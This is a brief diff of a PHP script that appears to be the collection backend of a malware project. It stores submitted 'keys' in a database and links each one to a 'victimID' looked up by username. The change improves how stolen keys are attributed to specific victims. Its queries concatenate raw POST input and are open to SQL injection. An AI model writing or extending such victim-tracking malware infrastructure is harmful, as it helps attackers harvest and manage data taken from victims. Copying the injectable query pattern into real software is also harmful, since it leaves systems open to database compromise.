@@ -2,8 +2,8 @@
 <?php
 require 'connect.php';
 if ($_POST){
-    # need to find way of getting victimID
-    $sql = "INSERT INTO keysTable VALUES(NULL,'".$_POST['key']."', '1','2022-08-22 08:56:39')";
+    # adds into table with correct user, and correct time
+    $sql = "INSERT INTO keysTable VALUES(NULL,'".$_POST['key']."', (SELECT victimID FROM victim WHERE UserName = '".$_POST['user']."'),NOW())";
     $result = $conn->query($sql);
 
     $conn->close();
